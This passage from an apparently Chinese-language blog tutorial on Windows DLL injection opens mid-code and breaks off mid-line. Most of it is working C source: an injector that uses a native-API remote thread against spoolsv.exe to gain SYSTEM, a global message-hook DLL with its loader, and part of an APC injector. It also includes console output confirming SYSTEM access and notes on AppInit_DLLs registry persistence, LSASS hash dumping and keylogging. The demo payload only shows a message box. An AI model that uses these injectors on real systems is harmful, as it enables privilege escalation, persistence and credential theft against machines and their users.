pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Remote thread created successfully via Native API.\n&quot;</span>);</span><br><span class="line">        WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">        DWORD exitCode = <span class="number">0</span>;</span><br><span class="line">        GetExitCodeThread(hThread, &amp;exitCode);</span><br><span class="line">        <span class="keyword">if</span> (exitCode == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection FAILED. LoadLibrary returned NULL.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection SUCCESS. Remote DLL Handle: 0x%lX\n&quot;</span>, exitCode);</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">    VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// 默认目标改为 spoolsv.exe 以测试 Session 0 注入</span></span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* targetProcessName = <span class="string">L&quot;spoolsv.exe&quot;</span>; </span><br><span class="line">    <span class="type">wchar_t</span> dllPath[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (!EnableDebugPrivilege()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to enable SeDebugPrivilege. Run as Administrator!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] SeDebugPrivilege Enabled.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (GetFullPathNameW(<span class="string">L&quot;MessageboxDllforSystem.dll&quot;</span>, MAX_PATH, dllPath, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;[-] Failed to get full path of DLL. Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查找 PID</span></span><br><span class="line">    wprintf(<span class="string">L&quot;[*] Searching for process: %s\n&quot;</span>, targetProcessName);</span><br><span class="line">    DWORD pid = GetProcessIdByName(targetProcessName);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Process not found. Make sure it is running.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Target PID: %lu\n&quot;</span>, pid);</span><br><span class="line">    <span class="comment">// 执行注入</span></span><br><span class="line">    <span class="keyword">if</span> (InjectDLL(pid, dllPath)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection sequence completed successfully.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-最厉害的效果"><a href="#攻击效果-最厉害的效果" class="headerlink" title="攻击效果 (最厉害的效果)"></a>攻击效果 (最厉害的效果)</h4><ul><li><strong>权限提升 (Privilege Escalation)</strong> ：成功注入系统服务后，DLL 将获得 <strong>SYSTEM (NT AUTHORITY\SYSTEM)</strong> 权限。</li><li><strong>完全控制</strong> ：这是 Windows 系统中的最高权限，可以无限制地修改系统文件、注册表，甚至转储密码哈希 (LSASS)。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Exploooosion\Desktop&gt; .\Project4.exe                                                                        [+] SeDebugPrivilege Enabled.                                                                                           [*] Searching for process: spoolsv.exe                                                                                  [+] Target PID: 4816                                                                                                    [+] Found Remote Kernel32 Base: 0x00007FF8AABC0000                                                                      [+] Calculated Remote LoadLibraryW: 0x00007FF8AABE0220                                                                  [*] Calling ZwCreateThreadEx to bypass Session 0 isolation...                                                           [+] Remote thread created successfully via Native API.                                                                  [+] Injection SUCCESS. Remote DLL Handle: 0x658C0000                                                                    [+] Injection sequence completed successfully.  </span><br><span class="line">========================================</span><br><span class="line">[+] Time: (New Injection Event)</span><br><span class="line">[+] Process ID   : 4816</span><br><span class="line">[+] Session ID   : 0 (0 means System Service Session)</span><br><span class="line">[+] Current User : SYSTEM</span><br><span class="line">[RESULT] -&gt; SUCCESS! Running as NT AUTHORITY\SYSTEM</span><br><span class="line">========================================</span><br></pre></td></tr></table></figure><p><img src="/image/2025-12-12-windows_dll_injection/1765532204002.png" alt="1765532204002"></p><h3 id="注册表注入-Registry-Modification"><a href="#注册表注入-Registry-Modification" class="headerlink" title="注册表注入 (Registry Modification)"></a>注册表注入 (Registry Modification)</h3><p>利用 Windows 加载机制的“被动”注入，常用于持久化。</p><h4 id="技术原理-2"><a href="#技术原理-2" class="headerlink" title="技术原理"></a>技术原理</h4><p>Windows 的 <code>User32.dll</code> 在初始化时会读取特定的注册表键值。如果配置了 <code>AppInit_DLLs</code>，所有加载 <code>User32.dll</code> 的进程（即几乎所有 GUI 程序）在启动时都会自动加载列表中的 DLL。</p><h4 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h4><p>不依赖内存操作 API，而是通过修改注册表键值。</p><ul><li>路径：<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</code></li><li>操作：设置 <code>LoadAppInit_DLLs</code> 为 1，并在 <code>AppInit_DLLs</code> 中填入恶意 DLL 路径。</li></ul><h4 id="核心-API-及作用-1"><a href="#核心-API-及作用-1" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul><li><code>RegOpenKeyEx</code> &#x2F; <code>RegSetValueEx</code>：用于修改注册表键值。</li><li><code>User32.dll</code> (系统机制)：当它被加载时，会自动解析上述注册表项并调用 <code>LoadLibrary</code>。</li></ul><h4 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h4><ul><li><strong>持久化 (Persistence)</strong> ：重启后依然有效。</li><li><strong>广撒网</strong> ：系统中几乎所有有界面的程序都会被注入，无需针对特定 PID。</li><li><em>注：在开启 Secure Boot 的现代系统中，此功能通常被禁用。</em></li></ul><h3 id="消息钩子注入-SetWindowsHookEx"><a href="#消息钩子注入-SetWindowsHookEx" class="headerlink" title="消息钩子注入 (SetWindowsHookEx)"></a>消息钩子注入 (SetWindowsHookEx)</h3><p>利用 Windows 消息传递机制的注入，常用于监控用户行为。</p><h4 id="技术原理-3"><a href="#技术原理-3" class="headerlink" title="技术原理"></a>技术原理</h4><p>Windows 允许程序安装“钩子”来截获系统消息（如键盘、鼠标事件）。如果安装的是 <strong>全局钩子</strong> （Global Hook），操作系统为了让回调函数能处理其他进程的消息，必须将包含回调函数的 DLL 强制映射到所有接收该消息的进程空间中。</p><h4 id="实现方法与流程-参考-hookinjection-c-GlobalHookDll-c"><a href="#实现方法与流程-参考-hookinjection-c-GlobalHookDll-c" class="headerlink" title="实现方法与流程 (参考 hookinjection.c, GlobalHookDll.c)"></a>实现方法与流程 (参考 <code>hookinjection.c</code>, <code>GlobalHookDll.c</code>)</h4><ol><li><strong>编写 DLL</strong> ：DLL 中必须包含钩子回调函数（如 <code>MyHookProc</code>）和导出安装函数。</li><li><strong>安装钩子</strong> ：加载器（Loader）加载 DLL，获取回调函数地址，调用 <code>SetWindowsHookEx</code>。</li><li><strong>触发注入</strong> ：一旦发生相关事件（如鼠标移动、按键），OS 自动将 DLL 注入到受影响的进程。</li></ol><h4 id="核心-API-及作用-2"><a href="#核心-API-及作用-2" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul><li><code>LoadLibrary</code> &#x2F; <code>GetProcAddress</code>：在加载器中加载恶意 DLL 并获取导出函数地址。</li><li><code>SetWindowsHookEx(WH_GETMESSAGE, hookProc, hDll, 0)</code>： <strong>核心触发点</strong> 。<ul><li><code>WH_GETMESSAGE</code> &#x2F; <code>WH_KEYBOARD</code>：指定监听的消息类型。</li><li>最后一项参数 <code>0</code>：表示 <strong>全局钩子</strong> ，这是触发系统级注入的关键，它告诉 OS 监控所有线程。</li></ul></li><li><code>CallNextHookEx</code>：在 DLL 回调函数中调用，确保消息能继续传递，防止系统卡死。</li></ul><p><code>GlobalHookDll.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GlobalHookDll.c</span></span><br><span class="line"><span class="comment">// 编译命令: gcc -shared -o GlobalHookDll.dll GlobalHookDll.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 宏定义：方便导出函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLLEXPORT __declspec(dllexport)</span></span><br><span class="line"><span class="comment">// 全局变量保存句柄和实例</span></span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE g_hInst = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 1. 钩子回调函数 (业务逻辑)</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">MyHookProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">    <span class="comment">// 只有当nCode &gt;= 0时才处理消息</span></span><br><span class="line">    <span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 为了演示，我们只在记事本里弹窗 (防止系统卡死)</span></span><br><span class="line">        <span class="type">char</span> path[MAX_PATH];</span><br><span class="line">        GetModuleFileNameA(<span class="literal">NULL</span>, path, MAX_PATH);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(path, <span class="string">&quot;notepad.exe&quot;</span>) || <span class="built_in">strstr</span>(path, <span class="string">&quot;Notepad.exe&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 简单的防重入标志，防止一个消息弹无数次窗</span></span><br><span class="line">            <span class="type">static</span> <span class="type">int</span> hasPopped = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (hasPopped == <span class="number">0</span>) &#123;</span><br><span class="line">                MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Exploooosion!&quot;</span>, <span class="string">&quot;Hacked&quot;</span>, MB_OK);</span><br><span class="line">                hasPopped = <span class="number">1</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 必须调用下一个钩子 [cite: 6]</span></span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 2. 导出函数：安装钩子 (参考附件 StartHook)</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">DLLEXPORT <span class="type">void</span> <span class="title function_">StartHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_hHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 在这里调用 API，而不是在 EXE 里</span></span><br><span class="line">        <span class="comment">// 参数 3 使用 g_hInst，这是 DllMain 获取到的自身模块句柄</span></span><br><span class="line">        <span class="comment">// 参数 4 填 0，代表全局注入 [cite: 7]</span></span><br><span class="line">        g_hHook = SetWindowsHookEx(WH_GETMESSAGE, MyHookProc, g_hInst, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[DLL] Hook installed successfully.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[DLL] Failed to install hook. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 3. 导出函数：卸载钩子 (参考附件 StopHook)</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">DLLEXPORT <span class="type">void</span> <span class="title function_">StopHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(g_hHook);</span><br><span class="line">        g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[DLL] Hook removed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 4. DllMain：获取自身句柄</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// 保存 DLL 自身的实例句柄，StartHook 需要用到它 [cite: 9]</span></span><br><span class="line">        g_hInst = hinstDLL; </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hookinjection.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HookLoader.c</span></span><br><span class="line"><span class="comment">// 编译命令: gcc -o HookLoader.exe HookLoader.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 定义函数指针类型，方便调用 DLL 里的函数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_StartHook)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_StopHook)</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_StartHook StartHook = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_StopHook StopHook = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 1. 加载 DLL</span></span><br><span class="line">    hDll = LoadLibraryA(<span class="string">&quot;GlobalHookDll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to load DLL.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 获取 DLL 中导出的 StartHook 和 StopHook 函数地址</span></span><br><span class="line">    StartHook = (PFN_StartHook)GetProcAddress(hDll, <span class="string">&quot;StartHook&quot;</span>);</span><br><span class="line">    StopHook  = (PFN_StopHook)GetProcAddress(hDll, <span class="string">&quot;StopHook&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!StartHook || !StopHook) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find exported functions.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 启动钩子</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Loader] Calling StartHook()...\n&quot;</span>);</span><br><span class="line">    StartHook(); <span class="comment">// 直接调用 DLL 内部的逻辑</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Hook is running globally.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Press ENTER to stop the hook and exit...\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 4. 阻塞主线程</span></span><br><span class="line">    <span class="comment">// 再次强调：Loader 必须活着，因为钩子是挂在这个进程名下的。</span></span><br><span class="line">    <span class="comment">// 如果 Loader 退出，StartHook 安装的钩子会被系统强制注销。</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="comment">// 5. 卸载钩子</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Loader] Calling StopHook()...\n&quot;</span>);</span><br><span class="line">    StopHook();</span><br><span class="line">    FreeLibrary(hDll);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-1"><a href="#攻击效果-1" class="headerlink" title="攻击效果"></a>攻击效果</h4><ul><li><strong>键盘记录 (Keylogger)</strong> ：通过 <code>WH_KEYBOARD</code> 钩子记录所有程序的键盘输入。</li><li><strong>隐蔽执行</strong> ：不需要创建新线程，代码在目标进程的主 UI 线程中执行。</li></ul><p><img src="/image/2025-12-12-windows_dll_injection/1765605236779.png" alt="1765605236779"></p><p><img src="/image/2025-12-12-windows_dll_injection/1765605309784.png" alt="1765605309784"></p><h3 id="APC-注入-QueueUserAPC"><a href="#APC-注入-QueueUserAPC" class="headerlink" title="APC 注入 (QueueUserAPC)"></a>APC 注入 (QueueUserAPC)</h3><p>利用线程异步过程调用队列的“隐蔽”注入技术。</p><h4 id="技术原理-4"><a href="#技术原理-4" class="headerlink" title="技术原理"></a>技术原理</h4><p>每个线程都有一个 APC（Asynchronous Procedure Call）队列。操作系统允许一个进程向另一个进程的线程队列中插入一个函数调用。当该目标线程进入“可警醒状态”（Alertable State，例如调用 <code>SleepEx</code>）时，它会优先执行队列中的函数。</p><h4 id="实现方法与流程-参考-ApcInjector-c"><a href="#实现方法与流程-参考-ApcInjector-c" class="headerlink" title="实现方法与流程 (参考 ApcInjector.c)"></a>实现方法与流程 (参考 <code>ApcInjector.c</code>)</h4><ol><li><strong>准备环境</strong> ：打开目标进程，分配内存，写入 DLL 路径（同 CreateRemoteThread）。</li><li><strong>枚举线程</strong> ：获取目标进程的所有线程 ID（因为 APC 是针对线程的）。</li><li><strong>插入请求</strong> ：遍历每一个线程，调用 <code>QueueUserAPC</code> 将 <code>LoadLibrary</code> 插入队列。</li><li><strong>等待触发</strong> ：攻击者无法主动触发，只能等待目标线程自行进入可警醒状态。</li></ol><h4 id="核心-API-及作用-3"><a href="#核心-API-及作用-3" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul><li><code>CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, ...)</code>：拍摄系统快照，用于枚举所有线程。</li><li><code>Thread32First</code> &#x2F; <code>Thread32Next</code>：遍历查找属于目标 PID 的线程 ID。</li><li><code>OpenThread(THREAD_SET_CONTEXT, ...)</code>：获取目标线程句柄，必须拥有设置上下文的权限。</li><li><code>QueueUserAPC(pLoadLibrary, hThread, pRemoteMem)</code>： <strong>核心触发点</strong> 。将 <code>LoadLibrary</code> 函数排队到目标线程的执行计划中。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;injector.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 编译命令: gcc -o ApcInjector.exe ApcInjector.c</span></span><br><span class="line"><span class="comment">// 确保 injector.h 在同级目录</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* targetProcessName = <span class="string">L&quot;notepad.exe&quot;</span>;</span><br><span class="line">    <span class="type">wchar_t</span> dllPath[MAX_PATH];</span><br><span class="line">    <span class="comment">// 使用 GetFullPathNameW</span></span><br><span class="line">    <span class="keyword">if</span> (GetFullPathNameW(<span class="string">L&quot;MessageboxDll.dll&quot;</span>, MAX_PATH, dllPath, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Failed to get full path of DLL. Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// =======================================</span></span><br><span class="line">    <span class="comment">// 1. 获取目标进程 PID</span></span><br><span class="line">    DWORD pid = GetProcessIdByName(targetProcessName);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Target process not found: %ls\n&quot;</span>, targetProcessName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found PID: %lu\n&quot;</span>, pid);</span><br><span class="line">    <span class="comment">// 2. 尝试提权 (如果是注入系统进程则必须，普通进程可选)</span></span><br><span class="line">    <span class="keyword">if</span> (EnableDebugPrivilege()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] SeDebugPrivilege enabled.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 打开目标进程</span></span><br><span class="line">    <span class="comment">// 需要 PROCESS_ALL_ACCESS 或至少 VM_WRITE/VM_OPERATION 权限 [cite: 29]</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. 在目标进程分配内存</span></span><br><span class="line">    <span class="type">size_t</span> pathSize = (wcslen(dllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>);</span><br><span class="line">    LPVOID pRemoteMem = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, pathSize, MEM_COMMIT, PAGE_READWRITE); <span class="comment">// [cite: 30]</span></span><br><span class="line">    <span class="keyword">if</span> (!pRemoteMem) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAllocEx failed.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 5. 写入 DLL 路径</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteMem, (LPVOID)dllPath, pathSize, <span class="literal">NULL</span>)) &#123; <span class="comment">// [cite: 31]</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] WriteProcessMemory failed.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] DLL path written to remote memory.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 6. 获取 LoadLibraryW 地址</span></span><br><span class="line">    <span class="comment">// Kernel32.dll 在所有进程中的基址通常相同，所以直接取本地地址即可 [cite: 32]</span></span><br><span class="line">    PTHREAD_START_ROUTINE pLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(<span 